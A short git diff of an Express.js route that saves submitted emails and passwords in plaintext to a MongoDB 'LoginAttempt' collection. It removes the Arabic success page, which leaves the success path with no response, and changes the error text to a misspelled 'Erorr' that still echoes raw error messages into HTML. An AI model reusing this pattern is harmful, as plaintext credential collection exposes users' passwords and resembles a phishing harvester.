@@ -40,18 +40,12 @@ app.post('/', async (req, res) => {
     const entry = new LoginAttempt({ email, password });
     await entry.save();
 
-    res.send(`
-      <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 60px; direction: rtl;">
-        <h2 style="color: #28a745;">✓ تم استلام البيانات وحفظها في MongoDB بنجاح!</h2>
-        <p>البريد الإلكتروني المسجل: <strong>${email}</strong></p>
-        <a href="/" style="display: inline-block; margin-top: 15px; padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px;">العودة للخلف</a>
-      </div>
-    `);
+   
   } catch (err) {
-    console.error('خطأ أثناء الحفظ:', err);
+    console.error('Erorr:', err);
     res.status(500).send(`
       <div style="font-family: Arial, sans-serif; text-align: center; margin-top: 60px; direction: rtl;">
-        <h2 style="color: #dc3545;">✗ حدث خطأ أثناء الحفظ في قاعدة البيانات</h2>
+        <h2 style="color: #dc3545;">✗Erorr</h2>
         <p>${err.message}</p>
         <a href="/">حاول مرة أخرى</a>
       </div>
